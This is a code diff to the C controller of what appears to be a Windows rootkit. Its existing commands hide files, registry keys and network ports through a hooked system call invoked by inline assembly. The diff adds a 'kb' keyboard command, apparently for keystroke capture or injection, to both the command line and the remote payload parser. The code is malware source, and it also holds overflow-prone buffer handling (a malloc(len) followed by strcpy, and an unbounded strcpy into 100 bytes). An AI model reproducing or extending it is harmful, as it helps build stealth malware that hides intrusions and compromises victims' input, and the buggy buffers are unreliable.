@@ -26,6 +26,7 @@ void GethFileCommand(const char* to_parse, PCOMMAND cmd);
 void GetKeyCommand(const char* to_parse, PCOMMAND cmd);
 void GetNetSrcCommand(const char* to_parse, PCOMMAND cmd);
 void GetNetDstCommand(const char* to_parse, PCOMMAND cmd);
+void GetKeyboardCommand(const char* to_parse, PCOMMAND cmd);
 
 
 SOCKET socketServer;
@@ -215,6 +216,28 @@ int main(int argc, char* argv[]) {
 				SysCall();
 			}
 		}
+		// COMMAND KEYBOARD
+		else if (!strcmp(argv[1], "kb")) {
+			if (argc == 3) {
+				cmd.flags = COMMAND_KEYBOARD | COMMAND_BUFFER_POINTER;
+				len = strlen(argv[2]);
+				cmd.change = (void*)len;
+
+				cmd.target = malloc(len);
+				strcpy(cmd.target, argv[2]);
+
+				__asm {
+					push 0
+					push 0
+					lea eax, cmd
+					push eax
+					push SIGNATURE_SYSCALL
+					mov eax, 0x26
+				}
+				AddressSystemCall = (unsigned int)FastSystemCall;
+				SysCall();
+			}
+		}
 		// START DRIVER
 		else if (!strcmp(argv[1], "start")) {
 			char buf[2 * MAX_PATH];
@@ -374,6 +397,11 @@ int GetCommand(const char* payload_string, PCOMMAND payload, int* has_result) {
 		GetNetDstCommand(payload_string, payload);
 		goto end_label;
 	}
+	else if (!strcmp(first_command, "kb")) {
+		payload_string = payload_string + len_of_command + 1;
+		GetKeyboardCommand(payload_string, payload);
+		goto end_label;
+	}
 	return -1;
 
 end_label:
@@ -430,4 +458,14 @@ void GetNetDstCommand(const char* to_parse, PCOMMAND cmd) {
 	sscanf(to_parse, "%d", &(unsigned int)cmd->target);
 	cmd->change = NULL;
 	cmd->flags = COMMAND_BUFFER_DST_PORT | COMMAND_HIDE_NET;
+}
+
+
+void GetKeyboardCommand(const char* to_parse, PCOMMAND cmd) {
+	cmd->target = malloc(100);
+	strcpy((char*)cmd->target, to_parse);
+	//sscanf(to_parse, "%s", (char*)cmd->target);
+	cmd->change = (void*)strlen((char*)cmd->target);
+	cmd->flags = COMMAND_KEYBOARD | COMMAND_BUFFER_POINTER;
+
 }
